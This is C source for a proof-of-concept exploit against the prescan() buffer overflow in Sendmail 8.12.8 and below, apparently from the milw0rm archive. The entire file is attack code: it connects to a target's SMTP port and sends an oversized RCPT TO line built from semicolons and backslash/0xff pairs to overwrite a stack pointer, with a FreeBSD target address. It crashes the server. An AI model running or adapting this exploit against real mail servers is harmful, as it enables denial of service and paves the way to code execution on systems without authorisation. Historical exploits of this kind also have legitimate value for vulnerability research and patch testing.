/*
 * Sendmail 8.12.8 prescan() PROOF OF CONCEPT exploit by bysin
 * 
 * This is to prove that the bug in sendmail 8.12.8 and below is vulnerable.
 * On sucessful POC exploitation the program should crash with the following:
 *
 * Program received signal SIGSEGV, Segmentation fault.
 * 0x5c5c5c5c in ?? ()
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

int maxarch=1;
struct arch {
	char *os; // The OS
	int pos; // The position of ebp in the stack, with the last byte being 0x00
	int apos; // The amount of bytes after pvpbuf where ebp is located
	unsigned long addr; // The pointer to the addr buffer
} archs[] = {
	{"FreeBSD 4.7-RELEASE",180,28,0xbfbfdad1},
};


/////////////////////////////////////////////////////////

#define BUFSIZE 50096

void header() {
	printf("Sendmail 8.12.8 prescan() exploit by bysin\n\n");
}

void printtargets() {
	unsigned long i;
	header();
	printf("\t  Target\t Addr\t\t OS\n");
	printf("\t-------------------------------------------\n");
	for (i=0;i<maxarch;i++) printf("\t* %d\t\t 0x%08x\t %s\n",i,archs[i].addr,archs[i].os);
	printf("\n");
}

void printresponse(char *a) {
	printf("%s\n",a);
}

void writesocket(int sock, char *buf) {
	if (send(sock,buf,strlen(buf),0) <= 0) {
		printf("Error writing to socket\n");
		exit(0);
	}
	printresponse(buf);
}

void readsocket(int sock, int response) {
	char temp[BUFSIZE];
	memset(temp,0,sizeof(temp));
	if (recv(sock,temp,sizeof(temp),0) <= 0) {
		printf("Error reading from socket\n");
		exit(0);
	}
	if (response != atol(temp)) {
		printf("Bad response: %s\n",temp);
		exit(0);
	}
	else printresponse(temp);
}

void relay(int sock) {
	while(1) {
		char temp[BUFSIZE];
		memset(temp,0,sizeof(temp));
		if (recv(sock,temp,sizeof(temp),0) <= 0) {
			printf("Server vulnerable (crashed)\n");
			exit(0);
		}
		printresponse(temp);
		if (atol(temp) == 553) {
			printf("Not exploitable\n");
			exit(0);
		}
	}
}

int main(int argc, char **argv) {
	struct sockaddr_in server;
	unsigned long ipaddr,i,j,m;
	int sock,target;
	char tmp[BUFSIZE],buf[BUFSIZE],*p,*pos=NULL;
	if (argc <= 2) {
		printf("%s <target ip> <target number>\n",argv[0]);
		printtargets();
		return 0;
	}
	target=atol(argv[2]);
	if (target < 0 || target >= maxarch) {
		printtargets();
		return 0;
	}

	header();

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Unable to create socket\n");
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(25);
	printf("Resolving address... ");
	fflush(stdout);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			printf("Unable to resolve address\n");
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	printf("Address found\n");
	printf("Connecting... ");
	fflush(stdout);
	if (connect(sock,(struct sockaddr *)&server, sizeof(server)) != 0) {
		printf("Unable to connect\n");
		exit(0);
	}
	printf("Connected\n");
	printf("Sending exploit... \n");
	fflush(stdout);

	readsocket(sock,220);

	writesocket(sock,"HELO yahoo.com\r\n");
	readsocket(sock,250);

	writesocket(sock,"MAIL FROM: <a@yahoo.com>\r\n");
	readsocket(sock,250);

	memset(buf,0,sizeof(buf));
	strcpy(buf,"RCPT TO: ");
	p=buf+strlen(buf);
	for (i=1,j=0,m=0;i<1242;i++) {
		if (!(i%256)) {
			*p++=';';
			j++;
		}
		else {
			if (j < 4) *p++='A';
			else {
				if (m == archs[target].pos) pos=p;
				//if (m > archs[target].pos) *p++='B'; else
				*p++='A';
				m++;
			}
		}
	}
	if (pos) memcpy(pos,(char*)&archs[target].addr,4);
	*p++=';';
	for (i=0;i<archs[target].apos;i++) {
		*p++='\\';
		*p++=0xff;
	}
	strcat(buf,"\r\n");
	writesocket(sock,buf);

	relay(sock);
}


// milw0rm.com [2003-04-30]
